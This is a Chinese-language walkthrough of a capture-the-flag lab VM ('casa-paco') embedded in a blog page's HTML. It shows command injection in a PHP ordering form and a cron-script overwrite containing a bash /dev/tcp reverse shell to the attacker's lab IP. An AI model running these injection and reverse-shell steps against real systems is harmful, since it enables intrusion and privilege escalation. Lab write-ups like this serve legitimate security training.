@@ -1,0 +1,1055 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# thl_casa-paco
+
+# 0.简介
+
+**靶机**：[thehackerslabs - casa-paco](https://thehackerslabs.com/casa-paco/)
+**难度**：初学者
+**目标 IP**：192.168.205.137
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.137
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 09:41 CST
+Nmap scan report for 192.168.205.137
+Host is up (0.00084s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:E2:C1:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.81 seconds
+
+```
+
+先看**80端口**，**22端口**候补
+
+# 2.踩点
+
+![image](https://github.com/user-attachments/assets/dc05800a-1c1f-4dc3-8f59-5866ab2d2370)
+
+把域名加入`hosts`
+
+![image](https://github.com/user-attachments/assets/4470ec18-041e-40c9-9b97-c5a3c0536d5c)
+
+是个点餐的网站，你按照它的提示一直点到下单页，你发现`Plato`可以**执行命令**，但是有**限制**，连`ls`都无法执行,并且**无法绕过**，爆破一下可执行命令
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -c -u 'http://casapaco.thl/llevar.php' -w /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt --hc 404 -d 'name=a&dish=FUZZ' --hw 89,75
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://casapaco.thl/llevar.php
+Total requests: 475254
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                            
+=====================================================================
+
+000000023:   200        32 L     109 W      1276 Ch     'w'                                                                
+000000110:   200        36 L     126 W      1478 Ch     'df'                                                               
+000000125:   200        33 L     95 W       1184 Ch     'du'                                                               
+000000238:   200        31 L     92 W       1202 Ch     'id'                                                               
+000000435:   200        50 L     170 W      1814 Ch     'ps'                                                               
+000000394:   200        31 L     90 W       1156 Ch     'od'                                                               
+000000513:   200        70 L     390 W      5108 Ch     'ss'                                                               
+000000601:   200        31 L     93 W       1172 Ch     'wc'                                                               
+000000581:   200        32 L     173 W      3792 Ch     'vi'                                                               
+000001112:   200        59 L     265 W      2439 Ch     'apt'                                                              
+000001160:   200        34 L     110 W      1476 Ch     'arp'                                                              
+000002956:   200        31 L     95 W       1215 Ch     'dir'  
+（省略）
+```
+
+发现可以执行`dir`
+
+![image](https://github.com/user-attachments/assets/bd300755-3984-4cff-aac8-c71f3c82033a)
+
+当你`dir`，你就会发现有一个叫`llevar1.php`的页面（爆破不出来，只可以这样看），你可以使用`od`工具查看他文本
+
+![image](https://github.com/user-attachments/assets/415d48a5-ba24-4df3-a6f3-893788a9ea68)
+
+我直接放**可读版本**了，想看原版的，自己执行一下
+
+```bash
+<!DOCTYPE html>
+<html lang='es'>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>Casa Paco - Para Llevar</title>
+    <link rel='stylesheet' href='static/styles.css'>
+</head>
+<body>
+    <header>
+        <h1>Casa Paco - Pedido para Llevar</h1>
+    </header>
+
+    <main>
+        <h2>Haz tu pedido para llevar</h2>
+        <form action='llevar.php' method='POST' class='order-form'>
+            <label for='name'>Nombre:</label>
+            <input type='text' id='name' name='name' placeholder='Tu nombre' required><br>
+          
+            <label for='dish'>Plato:</label>
+            <input type='text' id='dish' name='dish' placeholder='Ejemplo: Pizza' required><br>
+          
+            <button type='submit' class='btn'>Enviar Pedido</button>
+        </form>
+
+        <?php
+        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+            $name = htmlspecialchars($_POST['name']); // Sanitizamos para evitar errores visuales
+            $dish = $_POST['dish']; // Intencionalmente sin sanitizar para la vulnerabilidad
+
+            // Comando vulnerable
+            $output = shell_exec('$dish');
+
+            echo '<section class='confirmation'>';
+            echo '<h3>Pedido confirmado</h3>';
+            echo '<p>Gracias, <strong>$name</strong>. Tu pedido de <strong>$dish</strong> está listo para llevar.</p>';
+            echo '<h3>Salida del Comando:</h3>';
+            echo '<pre>$output</pre>';
+            echo '</section>';
+        }
+        ?>
+    </main>
+
+    <footer>
+        <p>&copy; 2025 Casa Paco. Todos los derechos reservados.</p>
+    </footer>
+</body>
+</html>
+```
+
+实现的和`llevar.php`一样，但是他没有**限制**，但是你不**锁死**这个网页，他就会把你的命令交给`llevar.php`执行，就寄寄，下面是`llevar.php`的代码
+
+```bash
+<!DOCTYPE html>
+<html lang='es'>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>Casa Paco - Pedido para Llevar</title>
+    <link rel='stylesheet' href='static/styles.css'>
+</head>
+<body>
+    <header>
+        <h1>Casa Paco - Pedido para Llevar</h1>
+    </header>
+
+    <main>
+        <h2>Haz tu pedido para llevar</h2>
+        <form action='llevar.php' method='POST' class='order-form'>
+            <label for='name'>Nombre:</label>
+            <input type='text' id='name' name='name' placeholder='Tu nombre' required><br>
+
+            <label for='dish'>Plato:</label>
+            <input type='text' id='dish' name='dish' placeholder='Ejemplo: Cocido' required><br>
+
+            <button type='submit' class='btn'>Enviar Pedido</button>
+        </form>
+    </main>
+
+    <?php
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $name = htmlspecialchars($_POST['name']);
+        $dish = $_POST['dish'];
+
+        // Filtrar comandos potencialmente peligrosos
+        $blacklist_pattern = '/\b(whoami|ls|pwd|cat|sh|bash)\b/i';
+        if (preg_match($blacklist_pattern, $dish)) {
+            die('<p style='color: red;'>Error: Pedido comprometido.</p>');
+        }
+
+        // Permitir solo caracteres válidos
+        $allowed_pattern = '/^[a-zA-Z0-9\s\-_\.]+$/';
+        if (!preg_match($allowed_pattern, $dish)) {
+            die('<p style='color: red;'>Error: Pedido contiene caracteres no permitidos.</p>');
+        }
+
+        // Ejecutar comando (no debe ser usado en un entorno de producción sin validaciones más estrictas)
+        $output = shell_exec($dish);
+        echo '<section class='confirmation'>';
+        echo '<h3>Pedido confirmado</h3>';
+        echo '<p>Gracias, <strong>$name</strong>. Tu pedido de <strong>$dish</strong> estará listo para llevar.</p>';
+        echo '<h3>Salida del Comando:</h3>';
+        echo '<pre>$output</pre>';
+        echo '</section>';
+    }
+    ?>
+  
+    <footer>
+        <p>&copy; 2025 Casa Paco. Todos los derechos reservados.</p>
+    </footer>
+</body>
+</html>
+
+```
+
+那就简单了我们锁死`llevar1.php`提交命令就好了
+
+![image](https://github.com/user-attachments/assets/fb94c611-0f65-4b33-922d-a52e4292dd06)
+
+要进行**base64绕过**，不然执行不了
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8888                                  
+listening on [any] 8888 ...
+id
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 45002
+bash: cannot set terminal process group (534): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Thehackerslabs-CasaPaco:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+```
+
+# 3. 获得稳定的 Shell
+
+获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：
+
+```bash
+script /dev/null -c bash  
+ctrl+z  
+stty raw -echo; fg  
+reset xterm  
+export TERM=xterm  
+echo $SHELL  
+export SHELL=/bin/bash  
+stty rows 59 cols 236
+```
+
+# 4.提权
+
+```bash
+www-data@Thehackerslabs-CasaPaco:/var/www/html$ cd /home/
+www-data@Thehackerslabs-CasaPaco:/home$ ls -la
+total 12
+drwxr-xr-x  3 root        root        4096 Jan 14 16:52 .
+drwxr-xr-x 18 root        root        4096 Jan 13 14:47 ..
+drwxr-xr-x  3 pacogerente pacogerente 4096 Jan 14 17:08 pacogerente
+www-data@Thehackerslabs-CasaPaco:/home$ cd pacogerente/
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ ls -al
+total 36
+drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 14 17:08 .
+drwxr-xr-x 3 root        root        4096 Jan 14 16:52 ..
+lrwxrwxrwx 1 root        root           9 Jan 14 16:58 .bash_history -> /dev/null
+-rw-r--r-- 1 pacogerente pacogerente  220 Mar 29  2024 .bash_logout
+-rw-r--r-- 1 pacogerente pacogerente 3526 Mar 29  2024 .bashrc
+drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 13 20:24 .local
+-rw-r--r-- 1 pacogerente pacogerente  807 Mar 29  2024 .profile
+-rwxrw-rw- 1 pacogerente pacogerente  110 Jan 14 16:57 fabada.sh
+-rw-r--r-- 1 root        root        2417 Jan 15 03:06 log.txt
+-rw-r--r-- 1 pacogerente pacogerente   33 Jan 14 17:06 user.txt
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh
+#!/bin/bash
+
+# Generar un log de actividad
+echo 'Ejecutado por cron el: $(date)' >> /home/pacogerente/log.txt
+
+```
+
+写个脚本覆盖掉`fabada.sh`就行了（不要问我为什么不看`pspy`，我看它长的都像定时任务☝( ◠‿◠ )☝）
+
+```bash
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ echo -e '#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.205.141/8889 0>&1' > fabada.
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh 
+#!/bin/bash
+/bin/bash -i >& /dev/tcp/192.168.205.141/8889 0>&1
+```
+
+等一会，它定时挺快的
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8889
+listening on [any] 8889 ...
+iconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 42802
+bash: no se puede establecer el grupo de proceso de terminal (4096): Función ioctl no apropiada para el dispositivo
+bash: no hay control de trabajos en este shell
+root@Thehackerslabs-CasaPaco:~# d
+id
+uid=0(root) gid=0(root) grupos=0(root)
+
+```
+
+下班。">
+<meta property="og:title" content="thl_casa-paco">
+<meta property="og:description" content="# thl_casa-paco
+
+# 0.简介
+
+**靶机**：[thehackerslabs - casa-paco](https://thehackerslabs.com/casa-paco/)
+**难度**：初学者
+**目标 IP**：192.168.205.137
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.137
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 09:41 CST
+Nmap scan report for 192.168.205.137
+Host is up (0.00084s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:E2:C1:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.81 seconds
+
+```
+
+先看**80端口**，**22端口**候补
+
+# 2.踩点
+
+![image](https://github.com/user-attachments/assets/dc05800a-1c1f-4dc3-8f59-5866ab2d2370)
+
+把域名加入`hosts`
+
+![image](https://github.com/user-attachments/assets/4470ec18-041e-40c9-9b97-c5a3c0536d5c)
+
+是个点餐的网站，你按照它的提示一直点到下单页，你发现`Plato`可以**执行命令**，但是有**限制**，连`ls`都无法执行,并且**无法绕过**，爆破一下可执行命令
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -c -u 'http://casapaco.thl/llevar.php' -w /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt --hc 404 -d 'name=a&dish=FUZZ' --hw 89,75
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://casapaco.thl/llevar.php
+Total requests: 475254
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                            
+=====================================================================
+
+000000023:   200        32 L     109 W      1276 Ch     'w'                                                                
+000000110:   200        36 L     126 W      1478 Ch     'df'                                                               
+000000125:   200        33 L     95 W       1184 Ch     'du'                                                               
+000000238:   200        31 L     92 W       1202 Ch     'id'                                                               
+000000435:   200        50 L     170 W      1814 Ch     'ps'                                                               
+000000394:   200        31 L     90 W       1156 Ch     'od'                                                               
+000000513:   200        70 L     390 W      5108 Ch     'ss'                                                               
+000000601:   200        31 L     93 W       1172 Ch     'wc'                                                               
+000000581:   200        32 L     173 W      3792 Ch     'vi'                                                               
+000001112:   200        59 L     265 W      2439 Ch     'apt'                                                              
+000001160:   200        34 L     110 W      1476 Ch     'arp'                                                              
+000002956:   200        31 L     95 W       1215 Ch     'dir'  
+（省略）
+```
+
+发现可以执行`dir`
+
+![image](https://github.com/user-attachments/assets/bd300755-3984-4cff-aac8-c71f3c82033a)
+
+当你`dir`，你就会发现有一个叫`llevar1.php`的页面（爆破不出来，只可以这样看），你可以使用`od`工具查看他文本
+
+![image](https://github.com/user-attachments/assets/415d48a5-ba24-4df3-a6f3-893788a9ea68)
+
+我直接放**可读版本**了，想看原版的，自己执行一下
+
+```bash
+<!DOCTYPE html>
+<html lang='es'>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>Casa Paco - Para Llevar</title>
+    <link rel='stylesheet' href='static/styles.css'>
+</head>
+<body>
+    <header>
+        <h1>Casa Paco - Pedido para Llevar</h1>
+    </header>
+
+    <main>
+        <h2>Haz tu pedido para llevar</h2>
+        <form action='llevar.php' method='POST' class='order-form'>
+            <label for='name'>Nombre:</label>
+            <input type='text' id='name' name='name' placeholder='Tu nombre' required><br>
+          
+            <label for='dish'>Plato:</label>
+            <input type='text' id='dish' name='dish' placeholder='Ejemplo: Pizza' required><br>
+          
+            <button type='submit' class='btn'>Enviar Pedido</button>
+        </form>
+
+        <?php
+        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+            $name = htmlspecialchars($_POST['name']); // Sanitizamos para evitar errores visuales
+            $dish = $_POST['dish']; // Intencionalmente sin sanitizar para la vulnerabilidad
+
+            // Comando vulnerable
+            $output = shell_exec('$dish');
+
+            echo '<section class='confirmation'>';
+            echo '<h3>Pedido confirmado</h3>';
+            echo '<p>Gracias, <strong>$name</strong>. Tu pedido de <strong>$dish</strong> está listo para llevar.</p>';
+            echo '<h3>Salida del Comando:</h3>';
+            echo '<pre>$output</pre>';
+            echo '</section>';
+        }
+        ?>
+    </main>
+
+    <footer>
+        <p>&copy; 2025 Casa Paco. Todos los derechos reservados.</p>
+    </footer>
+</body>
+</html>
+```
+
+实现的和`llevar.php`一样，但是他没有**限制**，但是你不**锁死**这个网页，他就会把你的命令交给`llevar.php`执行，就寄寄，下面是`llevar.php`的代码
+
+```bash
+<!DOCTYPE html>
+<html lang='es'>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>Casa Paco - Pedido para Llevar</title>
+    <link rel='stylesheet' href='static/styles.css'>
+</head>
+<body>
+    <header>
+        <h1>Casa Paco - Pedido para Llevar</h1>
+    </header>
+
+    <main>
+        <h2>Haz tu pedido para llevar</h2>
+        <form action='llevar.php' method='POST' class='order-form'>
+            <label for='name'>Nombre:</label>
+            <input type='text' id='name' name='name' placeholder='Tu nombre' required><br>
+
+            <label for='dish'>Plato:</label>
+            <input type='text' id='dish' name='dish' placeholder='Ejemplo: Cocido' required><br>
+
+            <button type='submit' class='btn'>Enviar Pedido</button>
+        </form>
+    </main>
+
+    <?php
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $name = htmlspecialchars($_POST['name']);
+        $dish = $_POST['dish'];
+
+        // Filtrar comandos potencialmente peligrosos
+        $blacklist_pattern = '/\b(whoami|ls|pwd|cat|sh|bash)\b/i';
+        if (preg_match($blacklist_pattern, $dish)) {
+            die('<p style='color: red;'>Error: Pedido comprometido.</p>');
+        }
+
+        // Permitir solo caracteres válidos
+        $allowed_pattern = '/^[a-zA-Z0-9\s\-_\.]+$/';
+        if (!preg_match($allowed_pattern, $dish)) {
+            die('<p style='color: red;'>Error: Pedido contiene caracteres no permitidos.</p>');
+        }
+
+        // Ejecutar comando (no debe ser usado en un entorno de producción sin validaciones más estrictas)
+        $output = shell_exec($dish);
+        echo '<section class='confirmation'>';
+        echo '<h3>Pedido confirmado</h3>';
+        echo '<p>Gracias, <strong>$name</strong>. Tu pedido de <strong>$dish</strong> estará listo para llevar.</p>';
+        echo '<h3>Salida del Comando:</h3>';
+        echo '<pre>$output</pre>';
+        echo '</section>';
+    }
+    ?>
+  
+    <footer>
+        <p>&copy; 2025 Casa Paco. Todos los derechos reservados.</p>
+    </footer>
+</body>
+</html>
+
+```
+
+那就简单了我们锁死`llevar1.php`提交命令就好了
+
+![image](https://github.com/user-attachments/assets/fb94c611-0f65-4b33-922d-a52e4292dd06)
+
+要进行**base64绕过**，不然执行不了
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8888                                  
+listening on [any] 8888 ...
+id
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 45002
+bash: cannot set terminal process group (534): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Thehackerslabs-CasaPaco:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+```
+
+# 3. 获得稳定的 Shell
+
+获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：
+
+```bash
+script /dev/null -c bash  
+ctrl+z  
+stty raw -echo; fg  
+reset xterm  
+export TERM=xterm  
+echo $SHELL  
+export SHELL=/bin/bash  
+stty rows 59 cols 236
+```
+
+# 4.提权
+
+```bash
+www-data@Thehackerslabs-CasaPaco:/var/www/html$ cd /home/
+www-data@Thehackerslabs-CasaPaco:/home$ ls -la
+total 12
+drwxr-xr-x  3 root        root        4096 Jan 14 16:52 .
+drwxr-xr-x 18 root        root        4096 Jan 13 14:47 ..
+drwxr-xr-x  3 pacogerente pacogerente 4096 Jan 14 17:08 pacogerente
+www-data@Thehackerslabs-CasaPaco:/home$ cd pacogerente/
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ ls -al
+total 36
+drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 14 17:08 .
+drwxr-xr-x 3 root        root        4096 Jan 14 16:52 ..
+lrwxrwxrwx 1 root        root           9 Jan 14 16:58 .bash_history -> /dev/null
+-rw-r--r-- 1 pacogerente pacogerente  220 Mar 29  2024 .bash_logout
+-rw-r--r-- 1 pacogerente pacogerente 3526 Mar 29  2024 .bashrc
+drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 13 20:24 .local
+-rw-r--r-- 1 pacogerente pacogerente  807 Mar 29  2024 .profile
+-rwxrw-rw- 1 pacogerente pacogerente  110 Jan 14 16:57 fabada.sh
+-rw-r--r-- 1 root        root        2417 Jan 15 03:06 log.txt
+-rw-r--r-- 1 pacogerente pacogerente   33 Jan 14 17:06 user.txt
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh
+#!/bin/bash
+
+# Generar un log de actividad
+echo 'Ejecutado por cron el: $(date)' >> /home/pacogerente/log.txt
+
+```
+
+写个脚本覆盖掉`fabada.sh`就行了（不要问我为什么不看`pspy`，我看它长的都像定时任务☝( ◠‿◠ )☝）
+
+```bash
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ echo -e '#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.205.141/8889 0>&1' > fabada.
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh 
+#!/bin/bash
+/bin/bash -i >& /dev/tcp/192.168.205.141/8889 0>&1
+```
+
+等一会，它定时挺快的
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8889
+listening on [any] 8889 ...
+iconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.137] 42802
+bash: no se puede establecer el grupo de proceso de terminal (4096): Función ioctl no apropiada para el dispositivo
+bash: no hay control de trabajos en este shell
+root@Thehackerslabs-CasaPaco:~# d
+id
+uid=0(root) gid=0(root) grupos=0(root)
+
+```
+
+下班。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/thl_casa-paco.html">
+<meta property="og:image" content="https://github.githubassets.com/favicons/favicon.svg">
+<title>thl_casa-paco</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">thl_casa-paco</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/43" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>thl_casa-paco</h1>
+<h1>0.简介</h1>
+<p><strong>靶机</strong>：<a href="https://thehackerslabs.com/casa-paco/" rel="nofollow">thehackerslabs - casa-paco</a><br>
+<strong>难度</strong>：初学者<br>
+<strong>目标 IP</strong>：192.168.205.137<br>
+<strong>本机 IP</strong>：192.168.205.141</p>
+<h1>1.扫描</h1>
+<p><code class="notranslate">nmap</code>起手</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.137
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 09:41 CST
+Nmap scan report <span class="pl-k">for</span> 192.168.205.137
+Host is up (0.00084s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:E2:C1:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 2.81 seconds
+</pre></div>
+<p>先看<strong>80端口</strong>，<strong>22端口</strong>候补</p>
+<h1>2.踩点</h1>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/dc05800a-1c1f-4dc3-8f59-5866ab2d2370"><img src="https://github.com/user-attachments/assets/dc05800a-1c1f-4dc3-8f59-5866ab2d2370" alt="image" style="max-width: 100%;"></a></p>
+<p>把域名加入<code class="notranslate">hosts</code></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/4470ec18-041e-40c9-9b97-c5a3c0536d5c"><img src="https://github.com/user-attachments/assets/4470ec18-041e-40c9-9b97-c5a3c0536d5c" alt="image" style="max-width: 100%;"></a></p>
+<p>是个点餐的网站，你按照它的提示一直点到下单页，你发现<code class="notranslate">Plato</code>可以<strong>执行命令</strong>，但是有<strong>限制</strong>，连<code class="notranslate">ls</code>都无法执行,并且<strong>无法绕过</strong>，爆破一下可执行命令</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -c -u <span class="pl-s"><span class="pl-pds">"</span>http://casapaco.thl/llevar.php<span class="pl-pds">"</span></span> -w /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt --hc 404 -d <span class="pl-s"><span class="pl-pds">"</span>name=a&amp;dish=FUZZ<span class="pl-pds">"</span></span> --hw 89,75
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="pl-s"><span class="pl-pds">'</span>s documentation for more information.</span>
+<span class="pl-s">********************************************************</span>
+<span class="pl-s">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span>
+<span class="pl-s">********************************************************</span>
+<span class="pl-s"></span>
+<span class="pl-s">Target: http://casapaco.thl/llevar.php</span>
+<span class="pl-s">Total requests: 475254</span>
+<span class="pl-s"></span>
+<span class="pl-s">=====================================================================</span>
+<span class="pl-s">ID           Response   Lines    Word       Chars       Payload                                                            </span>
+<span class="pl-s">=====================================================================</span>
+<span class="pl-s"></span>
+<span class="pl-s">000000023:   200        32 L     109 W      1276 Ch     "w"                                                                </span>
+<span class="pl-s">000000110:   200        36 L     126 W      1478 Ch     "df"                                                               </span>
+<span class="pl-s">000000125:   200        33 L     95 W       1184 Ch     "du"                                                               </span>
+<span class="pl-s">000000238:   200        31 L     92 W       1202 Ch     "id"                                                               </span>
+<span class="pl-s">000000435:   200        50 L     170 W      1814 Ch     "ps"                                                               </span>
+<span class="pl-s">000000394:   200        31 L     90 W       1156 Ch     "od"                                                               </span>
+<span class="pl-s">000000513:   200        70 L     390 W      5108 Ch     "ss"                                                               </span>
+<span class="pl-s">000000601:   200        31 L     93 W       1172 Ch     "wc"                                                               </span>
+<span class="pl-s">000000581:   200        32 L     173 W      3792 Ch     "vi"                                                               </span>
+<span class="pl-s">000001112:   200        59 L     265 W      2439 Ch     "apt"                                                              </span>
+<span class="pl-s">000001160:   200        34 L     110 W      1476 Ch     "arp"                                                              </span>
+<span class="pl-s">000002956:   200        31 L     95 W       1215 Ch     "dir"  </span>
+<span class="pl-s">（省略）</span></pre></div>
+<p>发现可以执行<code class="notranslate">dir</code></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/bd300755-3984-4cff-aac8-c71f3c82033a"><img src="https://github.com/user-attachments/assets/bd300755-3984-4cff-aac8-c71f3c82033a" alt="image" style="max-width: 100%;"></a></p>
+<p>当你<code class="notranslate">dir</code>，你就会发现有一个叫<code class="notranslate">llevar1.php</code>的页面（爆破不出来，只可以这样看），你可以使用<code class="notranslate">od</code>工具查看他文本</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/415d48a5-ba24-4df3-a6f3-893788a9ea68"><img src="https://github.com/user-attachments/assets/415d48a5-ba24-4df3-a6f3-893788a9ea68" alt="image" style="max-width: 100%;"></a></p>
+<p>我直接放<strong>可读版本</strong>了，想看原版的，自己执行一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&lt;</span><span class="pl-k">!</span>DOCTYPE html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>html lang=<span class="pl-s"><span class="pl-pds">"</span>es<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>head<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>meta charset=<span class="pl-s"><span class="pl-pds">"</span>UTF-8<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>meta name=<span class="pl-s"><span class="pl-pds">"</span>viewport<span class="pl-pds">"</span></span> content=<span class="pl-s"><span class="pl-pds">"</span>width=device-width, initial-scale=1.0<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>title<span class="pl-k">&gt;</span>Casa Paco - Para Llevar<span class="pl-k">&lt;</span>/title<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>link rel=<span class="pl-s"><span class="pl-pds">"</span>stylesheet<span class="pl-pds">"</span></span> href=<span class="pl-s"><span class="pl-pds">"</span>static/styles.css<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
